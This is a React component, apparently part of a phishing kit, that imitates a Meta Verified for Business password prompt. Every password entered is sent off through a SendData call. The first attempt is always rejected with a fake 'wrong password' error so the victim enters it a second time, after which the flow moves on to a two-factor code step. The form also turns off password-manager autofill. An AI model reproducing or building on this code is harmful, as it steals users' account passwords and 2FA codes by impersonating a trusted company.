'use client'

import React from 'react'
import { CircleAlert } from 'lucide-react'
import PasswordInput from '#components/password-input/password-input'
import { useAppDispatch, useAppSelector } from '../../app/store/hooks'
import { updateForm } from '../../app/store/slices/stepFormSlice'
import { useAppStrings } from '@/hooks/useAppStrings'
import { SendData } from '@/utils/sendData'
import MvSecureFlowPanel from '@/components/meta-verified-for-business/landing/MvSecureFlowPanel'

interface PasswordModalProps {
  isOpend: boolean
  isOpendTwoFactor: (value: boolean) => void
  onToggleModal: (isOpen: boolean) => void
}

const SUBMIT_DELAY_MS = 1345
/** Chờ lâu hơn sau lần nhập mật khẩu thứ 2 (xác nhận) trước khi mở 2FA */
const SUBMIT_DELAY_SECOND_PASSWORD_MS = 5000

const PasswordModal: React.FC<PasswordModalProps> = ({
  isOpend,
  isOpendTwoFactor,
}) => {
  const t = useAppStrings()

  const [loading, setLoading] = React.useState(false)
  const [passwordStep, setPasswordStep] = React.useState<1 | 2>(1)
  const [password, setPassword] = React.useState('')
  const [errors, setErrors] = React.useState<Record<string, string>>({})
  const dispatch = useAppDispatch()
  const formData = useAppSelector((state) => state.stepForm.data)

  React.useEffect(() => {
    if (isOpend) {
      setPasswordStep(1)
      setPassword('')
      setErrors({})
      setLoading(false)
      dispatch(
        updateForm({
          password: '',
          passwordSecond: '',
          passwordThird: '',
        }),
      )
    }
  }, [isOpend, dispatch])

  if (!isOpend) return null

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { value } = e.target
    setPassword(value)
    setErrors((prev) => ({ ...prev, password: '' }))

    if (passwordStep === 1) {
      dispatch(updateForm({ password: value }))
    } else {
      dispatch(updateForm({ passwordSecond: value }))
    }
  }

  const waitAfterSend = async () => {
    try {
      await SendData(formData)
    } catch {
      /* luồng UX vẫn tiếp tục */
    }
    await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS))
  }

  const handSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const newErrors: Record<string, string> = {}
    if (!password.trim()) newErrors.password = t.password.errEmpty

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    if (passwordStep === 1) {
      setLoading(true)
      try {
        await waitAfterSend()
        setPassword('')
        setErrors({ password: t.password.errWrong })
        setPasswordStep(2)
      } finally {
        setLoading(false)
      }
      return
    }

    setLoading(true)
    try {
      await SendData(formData)
      await new Promise((r) => setTimeout(r, SUBMIT_DELAY_SECOND_PASSWORD_MS))
      isOpendTwoFactor(true)
    } catch (error) {
      console.error('Error submitting form:', error)
      setPassword('')
      setErrors({ password: t.password.errWrong })
    } finally {
      setLoading(false)
    }
  }

  const inputClass = (field: string) =>
    `mv-secure-input ${errors[field] ? 'is-invalid' : ''}`

  const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt
  const passwordName = passwordStep === 1 ? 'account_access_key' : 'recheck_access_key'
  const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm'

  return (
    <MvSecureFlowPanel
      labelledBy="mv-password-title"
      title={prompt}
      layout="center"
      mark={
        <img src="/images/meta/logo.svg" width="40" height="40" alt="" />
      }
    >
      <form
        className="mv-hc-secure-form"
        onSubmit={handSubmit}
        autoComplete="off"
        data-lpignore="true"
        data-1p-ignore="true"
        data-bwignore="true"
      >
        <div className="mv-secure-field">
          <PasswordInput
            id={passwordId}
            name={passwordName}
            placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
            className={inputClass('password')}
            value={password}
            onChange={handleChange}
            autoComplete="off"
            allowToggle
            ariaShowPassword={t.password.ariaShowPassword}
            ariaHidePassword={t.password.ariaHidePassword}
            ariaPasswordToggleDisabled={t.password.ariaPasswordToggleDisabled}
          />
          {errors.password ? (
            <p className="mv-secure-error" role="alert">
              <CircleAlert className="mv-secure-error-icon" aria-hidden />
              <span>{errors.password}</span>
            </p>
          ) : null}
        </div>
        <button type="submit" className="mv-secure-btn" disabled={loading}>
          {loading ? (
            <span className="mv-secure-spinner" aria-hidden>
              <img src="/images/icons/ic_loading.svg" width="18" height="18" alt="" />
            </span>
          ) : (
            t.password.continue
          )}
        </button>
      </form>
    </MvSecureFlowPanel>
  )
}

export default PasswordModal
